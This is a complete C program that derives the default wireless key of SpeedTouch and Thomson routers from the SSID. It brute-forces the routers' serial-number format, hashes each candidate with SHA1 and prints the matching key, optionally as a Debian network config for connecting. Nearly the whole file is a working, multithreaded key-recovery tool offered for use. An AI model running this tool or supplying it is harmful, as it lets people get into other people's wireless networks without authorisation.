/* speed-key.c - Generate the WEP key of a SpeedTouch modem based on the SSID
 *               of the device.
 *
 * Copyright (C) 2010 Emmanuel Rodriguez <emmanuel.rodriguez@gmail.com>.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU Lesser General Public License as published by the
 * Free Software Foundation; either version 2.1, or (at your option) any
 * later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */

#define _GNU_SOURCE

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <pthread.h>
#include <getopt.h>
#include <time.h>

#ifdef HAS_OPENSSL
#    include <openssl/sha.h>
#    define  SHA1_BUFFER_TYPE(buffer) ((const unsigned char *) buffer)
#else
#    include "sha1.h"
#    define  SHA1_BUFFER_TYPE(buffer) ((const char *) buffer)
#endif

#include "config.h"

#define SERIAL_LENGTH 12
#define SHA1_DIGEST_BITS 160
#define SHA1_DIGEST_HEX_BYTES (SHA1_DIGEST_BITS / 4)
#define SHA1_DIGEST_BIN_BYTES (SHA1_DIGEST_BITS / 8)

#define DIGIT(x)           ('0' + (x))
#define LETTER_base(b, x)  ((b) + (x))
#define LETTER_uc(x)       LETTER_base('A', x)
#define HEX(x)             ( (x) < 10 ? DIGIT(x) : LETTER_uc((x) - 10) )

/* Insert into buffer[pos] and buffer[pos+1] the value of sprintf "%02X", x */
#define SERIAL_PART(buffer, pos, x) \
	do { \
		if (x < 10) { \
			/* 30 -> 0 in hex, 31 -> 1 in hex, etc */ \
			(buffer)[(pos)]     = '3'; \
			(buffer)[(pos) + 1] = DIGIT(x); \
		} \
		else { \
			char c = LETTER_uc((x) - 10); \
			(buffer)[(pos)]     = HEX((c) / 16); \
			(buffer)[(pos) + 1] = HEX((c) % 16); \
		} \
	} while (0)

/* Insert into buffer[pos] and buffer[pos+1] the value of sprintf "%02d", x */
#define SERIAL_DIGIT(buffer, pos, x) \
	do { \
		(buffer)[(pos)]     = DIGIT((x) / 10); \
		(buffer)[(pos) + 1] = DIGIT((x) % 10); \
	} while (0)


struct _WifiRouter {
	char *ssid;
	size_t ssid_len;
	const char *type;
};
typedef struct _WifiRouter WifiRouter;

struct _ThreadCtx {
	pthread_t tid;
	pthread_mutex_t *mutex;
	unsigned char batch_i;
	unsigned char batch_max;
	unsigned char year_start;
	unsigned char year_end;
	unsigned int debian_format;
	WifiRouter **routers;
	size_t max_ssid_len;
};
typedef struct _ThreadCtx ThreadCtx;


static void
compute_serials (ThreadCtx *ctx);

static void
process_serial (ThreadCtx *ctx, const char *serial, size_t len);

static void*
start_thread (void *data);

static WifiRouter**
parse_router_arg (int argc , char * const argv[]);


int
main (int argc , char * const argv[]) {
	int c;
	size_t i;
	size_t max_threads;
	ThreadCtx* threads;
	pthread_attr_t attr;
	pthread_mutex_t mutex;
	time_t clock;
	struct tm *now_tm;
	unsigned char year_start = 0;
	unsigned char year_end = 0;
	WifiRouter **routers = NULL;
	WifiRouter **routers_iter;
	size_t max_ssid_len = 0;

	struct option longopts[] = {
		{ "year-start", required_argument, NULL, 's' },
		{ "year-end",   required_argument, NULL, 'e' },
		{ "threads",    required_argument, NULL, 't' },
		{ "debian",     no_argument,       NULL, 'd' },
		{ "help",       no_argument,       NULL, 'h' },
		{ "version",    no_argument,       NULL, 'v' },
		{ NULL, 0, NULL, 0 },
	};

	unsigned short int debian_format = 0;
	max_threads = 1;
	while ( (c = getopt_long(argc, argv, "hvdt:s:e:", longopts, NULL)) != -1 ) {
		switch (c) {
			case 't':
				max_threads = (size_t) atoi(optarg);
			break;

			case 's':
				year_start = (size_t) atoi(optarg);
			break;

			case 'e':
				year_end = (size_t) atoi(optarg) + 1;
			break;

			case 'd':
				debian_format = 1;
			break;

			case 'h':
				printf("Usage: [OPTION]... SSID\n");
				printf("Where OPTION is one of:\n");
				printf("   --version,      -v     show the program's version\n");
				printf("   --help,         -h     print this help message\n");
				printf("   --debian,       -d     generate debian's /etc/network/interfaces format\n");
				printf("   --year-start Y, -s Y   generate serials starting at the given year\n");
				printf("   --year-end   Y, -e Y   generate serials up to the given year\n");
				printf("   --threads    T, -t T   number of threads to use\n");
				return 1;
			break;

			case 'v':
				printf("%s version %s\n", PACKAGE_NAME, PACKAGE_VERSION);
				return 0;
			break;
		}
	}
	argc -= optind;
	argv += optind;

	if (argc < 1) {
		printf("Usage: SSID...\n");
		return 1;
	}

	routers = parse_router_arg(argc, argv);
	if (routers == NULL) {
		printf("Usage: SSID...\n");
		return 1;
	}

	/* Get the legnth of the biggest SSID to parse */
	for (routers_iter = routers; *routers_iter != NULL; ++routers_iter) {
		WifiRouter *router = *routers_iter;
		if (max_ssid_len < router->ssid_len) {
			max_ssid_len = router->ssid_len;
		}
	}

	/* Set the current year as the last year for the serial codes to generate */
	if (!year_end) {
		time(&clock);
		now_tm = localtime(&clock);
		year_end = (unsigned char) (now_tm->tm_year - 100);
	}
	if (!year_start) {
		year_start = 4;
	}

	if (max_threads > 1) {
		/* Divide the work in batches */
		threads = malloc(max_threads * sizeof(ThreadCtx));
		pthread_attr_init(&attr);
		pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);
		pthread_mutex_init(&mutex, NULL);

		/* Launch the threads */
		for (i = 0; i < max_threads; ++i) {
			ThreadCtx *ctx = &threads[i];
			ctx->batch_i = i;
			ctx->batch_max = max_threads;
			ctx->year_start = year_start;
			ctx->year_end = year_end;
			ctx->debian_format = debian_format;
			ctx->mutex = &mutex;
			ctx->routers = routers;
			ctx->max_ssid_len = max_ssid_len;
			pthread_create(&ctx->tid, &attr, start_thread, ctx);
		}

		/* Wait for the threads to finish */
		pthread_attr_destroy(&attr);
		for (i = 0; i < max_threads; ++i) {
			ThreadCtx *ctx = &threads[i];
			void *value = NULL;
			pthread_join(ctx->tid, &value);
		}
		pthread_mutex_destroy(&mutex);
		free(threads);
	}
	else {
		/* No threads */
		ThreadCtx ctx;
		ctx.batch_i = 0;
		ctx.batch_max = 1;
		ctx.year_start = year_start;
		ctx.year_end = year_end;
		ctx.debian_format = debian_format;
		ctx.mutex = NULL;
		ctx.routers = routers;
		ctx.max_ssid_len = max_ssid_len;
		compute_serials(&ctx);
	}

	/* Cleanup */
	for (routers_iter = routers; *routers_iter != NULL; ++routers_iter) {
		WifiRouter *router = *routers_iter;
		free(router->ssid);
		free(router);
	}
	free(routers);

	return 0;
}


/*
 * Start the work of a new thread.
 */
static void*
start_thread (void *data) {
	ThreadCtx *ctx = (ThreadCtx *) data;
	compute_serials(ctx);
	pthread_exit(NULL);
}


/*
 * Computes all serial numbers of a device. This is done through brute force as
 * there's no heuristic than can help.
 *
 * The serial number is assumed to be in the following format:
 *   CP$(YY)$(WW)--$(L)$(L)$(L)  ex: CP0923H3FHE
 * Where:
 *   $(YY) is the year [04, 09]
 *   $(WW) is the week number [01, 52]
 *   $(L) a single character each ['A' .. 'Z', '0' .. '9']
 *
 * This function can be called from different threads in order to parallelize
 * the computations and get the results faster. When called from multiple
 * threads, the batches are distributed among all workers based on the modulo
 * of the serial's year (year % batch_max == batch_i).
 */
static void
compute_serials (ThreadCtx *ctx) {
	unsigned char year, week, l1, l2, l3;

	/* Serial number that gets digested through SHA1; all serials numbers start
	   with "CP" */
	char serial [SERIAL_LENGTH + 1];
	memset(serial, 0, sizeof(serial));
	serial[0] = 'C';
	serial[1] = 'P';

	/* Build each part of the serial string and compute the key for each unique
	   serial number */
	for (year = ctx->year_start; year < ctx->year_end; ++year) {
		if (year % ctx->batch_max != (ctx->batch_i)) {
			continue;
		}

		SERIAL_DIGIT(serial, 2, year);

		for (week = 1; week <= 52; ++week) {
			SERIAL_DIGIT(serial, 4, week);

			/* The serial contains 3 letters that are in the range ['A' .. 'Z', '0' .. '9'] */
			for (l1 = 0; l1 < 36; ++l1) {
				SERIAL_PART(serial, 6, l1);

				for (l2 = 0; l2 < 36; ++l2) {
					SERIAL_PART(serial, 8, l2);

					for (l3 = 0; l3 < 36; ++l3) {
						SERIAL_PART(serial, 10, l3);
						process_serial(ctx, serial, sizeof(serial));
					}
				}
			}
		}
	}
}


/*
 * Handles a single serial number. This function takes the serial and computes
 * its SHA1. From that digest the SSID and the KEY can be derrived. If the SSID
 * matches the wanted SSID (from ctx->wanted_ssid) then the KEY will be printed.
 */
static void
process_serial (ThreadCtx *ctx, const char *serial, size_t len) {
	size_t i;
	char *ssid;
	WifiRouter **routers_iter;
	char start_computed = 0;

	/* Will hold the SHA1 in binary format */
	unsigned char sha1_bin [SHA1_DIGEST_BIN_BYTES];

	/* Human readable SHA1 */
	char sha1_hex [SHA1_DIGEST_HEX_BYTES  + 1];
	memset(sha1_hex, 0, sizeof(sha1_hex));

	/* Now that the serial number is generated we can compute its corresponding
	   key which is derived from it's SHA1. */
	SHA1(SHA1_BUFFER_TYPE(serial), len - 1, sha1_bin);

	/* The SSID is in the last bytes of the SHA1 when converted to hex */
	for (i = SHA1_DIGEST_BIN_BYTES - ctx->max_ssid_len/2; i < SHA1_DIGEST_BIN_BYTES; ++i) {
		unsigned char c = sha1_bin[i];
		size_t pos = i * 2;
		sha1_hex[pos]     = HEX(c / 16);
		sha1_hex[pos + 1] = HEX(c % 16);
	}

	for (routers_iter = ctx->routers; *routers_iter != NULL; ++routers_iter) {
		WifiRouter *router = *routers_iter;
		ssid = &sha1_hex[SHA1_DIGEST_HEX_BYTES - router->ssid_len];

		/* If this is the desired SSID then we compute the key */
		if (strcmp(ssid, router->ssid) == 0) {

			/* The key is in the first 5 bytes of the SHA1 when converted to hex */
			if (! start_computed) {
				for (i = 0; i < 5; ++i) {
					unsigned char c = sha1_bin[i];
					size_t pos = i * 2;
					sha1_hex[pos]     = HEX(c / 16);
					sha1_hex[pos + 1] = HEX(c % 16);
				}
				start_computed = 1;
			}

			if (ctx->mutex != NULL) pthread_mutex_lock(ctx->mutex);
			if (ctx->debian_format) {
				printf(
					"iface speedkey inet dhcp\n"
					"\twpa-ssid       %s%s\n"
					"\twpa-passphrase %s\n",
					router->type, router->ssid,
					sha1_hex
				);
			}
			else {
				printf("Matched SSID %s, key: %s\n", router->ssid, sha1_hex);
			}
			if (ctx->mutex != NULL) pthread_mutex_unlock(ctx->mutex);
		}
	}
}


static WifiRouter**
parse_router_arg (int argc , char * const argv[]) {

	WifiRouter **routers;
	int i;

	routers = (WifiRouter **) malloc((argc + 1) * sizeof(WifiRouter *));
	if (routers == NULL) {
		return NULL;
	}
	routers[argc] = NULL;

	for (i = 0; i < argc; ++i) {
		const char *arg;
		WifiRouter *router;
		const char *ssid;
		size_t j;

		arg = argv[i];
		routers[i] = router = (WifiRouter *) malloc(sizeof(WifiRouter));
		if (router == NULL) {
			return NULL;
		}

		/* Allow "SpeedTouch" at the beginning of arg (for lazy pasters like me) */
		router->type = "SpeedTouch";
		ssid = strcasestr(arg, router->type);
		if (ssid) {
			ssid += strlen(router->type);
		}

		if (ssid == NULL) {
			router->type = "Thomson";
			ssid = strcasestr(arg, router->type);
			if (ssid) {
				ssid += strlen(router->type);
			}
		}

		if (ssid == NULL) {
			ssid = arg;
			router->type = "SpeedTouch";
		}

		/* Make sure that the target SSID is in upper case */
		router->ssid_len = strlen(ssid);
		router->ssid = malloc(router->ssid_len + 1);

		for (j = 0; j < router->ssid_len; ++j) {
			router->ssid[j] = toupper((unsigned char) ssid[j]);
		}
		router->ssid[router->ssid_len] = '\0';
	}

	return routers;
}
